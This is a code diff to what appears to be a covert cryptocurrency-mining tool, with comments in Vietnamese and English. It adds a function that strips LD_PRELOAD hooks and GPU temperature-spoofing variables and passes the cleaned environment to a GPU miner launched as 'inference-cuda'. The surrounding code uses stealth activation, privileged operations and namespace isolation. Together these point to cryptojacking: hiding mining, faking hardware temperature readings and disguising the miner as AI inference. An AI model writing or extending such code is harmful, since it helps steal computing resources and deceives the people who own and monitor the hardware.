@@ -48,6 +48,40 @@ from mining_environment.scripts.privileged_operations import get_privileged_mana
 from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
 
 # **Import** (nhập khẩu) **Mining Performance Logger** (trình ghi nhật ký hiệu suất khai thác – theo dõi và ghi lại các chỉ số)
+
+def create_clean_gpu_environment():
+    """
+    **GPU Hook Cleanup Function** (hàm dọn dẹp hook GPU)
+    
+    Tạo **environment dictionary** (từ điển môi trường) sạch cho **GPU mining** 
+    bằng cách **vô hiệu hóa** các **GPU hooks** (LD_PRELOAD, TEMP_SPOOF)
+    
+    Returns:
+        dict: Environment variables đã được làm sạch cho GPU mining
+    """
+    # **Copy current environment** (sao chép môi trường hiện tại)
+    clean_env = os.environ.copy()
+    
+    # **Remove GPU hook variables** (loại bỏ biến hook GPU)
+    gpu_hook_vars = [
+        'LD_PRELOAD',           # **Library Dynamic Preload** - nạp thư viện hook trước
+        'ENABLE_TEMP_SPOOF',    # **Temperature Spoofing** - giả mạo nhiệt độ
+        'SPOOF_TEMP_VALUE',     # **Spoofed Temperature Value** - giá trị nhiệt độ giả
+        'TEMP_SPOOF_ADD_NOISE', # **Temperature Noise Addition** - thêm nhiễu nhiệt độ
+    ]
+    
+    removed_vars = []
+    for var in gpu_hook_vars:
+        if var in clean_env:
+            removed_vars.append(f"{var}={clean_env[var]}")
+            del clean_env[var]
+    
+    if removed_vars:
+        logger.info(f"🧹 [GPU HOOK CLEANUP] Removed GPU hook variables: {', '.join(removed_vars)}")
+    else:
+        logger.info(f"🧹 [GPU HOOK CLEANUP] No GPU hook variables found to remove")
+    
+    return clean_env
 from mining_environment.logging.mining_performance_logger import (
     register_mining_process,
     log_hash_rate,
@@ -489,12 +523,19 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     if enable_ns and privileged_manager:
         logger.info("Sử dụng PrivilegedOperationManager cho **namespace isolation** (cô lập không gian tên)")
 
+    # **GPU Environment Cleanup** (dọn dẹp môi trường GPU) - loại bỏ hooks cho GPU mining
+    subprocess_env = None
+    if not cpu:  # Only for GPU mining
+        subprocess_env = create_clean_gpu_environment()
+        logger.info(f"🧹 [GPU HOOK CLEANUP] Using clean environment for inference-cuda (GPU mining)")
+    
     for attempt in range(1, retries + 1):
         logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần thử {attempt}/{retries})...")
         # **Debug logging** (ghi nhật ký gỡ lỗi) cho **GPU process creation** (tạo tiến trình GPU)
         if not cpu:
             logger.info(f"🔍 GPU Debug - Command: {' '.join(mining_command)}")
             logger.info(f"🔍 GPU Debug - Stealth: {enable_stealth}, NS: {enable_ns}")
+            logger.info(f"🔍 GPU Debug - Clean Environment: {subprocess_env is not None}")
         try:
             # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
             if enable_stealth:
@@ -523,7 +564,8 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT,
                         universal_newlines=True,
-                        bufsize=1
+                        bufsize=1,
+                        env=subprocess_env  # **Clean environment** cho GPU mining
                     )
                     if process:
                         logger.info(f"✅ [SELF-STEALTH] {miner_type} stealth process started with PID: {process.pid}")
@@ -538,7 +580,8 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT,
                         universal_newlines=True,
-                        bufsize=1
+                        bufsize=1,
+                        env=subprocess_env  # **Clean environment** cho GPU mining
                     )
             elif enable_ns and privileged_manager:
                 # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
@@ -548,7 +591,8 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
                     universal_newlines=True,
-                    bufsize=1
+                    bufsize=1,
+                    env=subprocess_env  # **Clean environment** cho GPU mining
                 )
             else:
                 # **Standard subprocess** (tiến trình con tiêu chuẩn)
@@ -558,7 +602,8 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
                     universal_newlines=True,
-                    bufsize=1
+                    bufsize=1,
+                    env=subprocess_env  # **Clean environment** cho GPU mining
                 )
             
             if process:
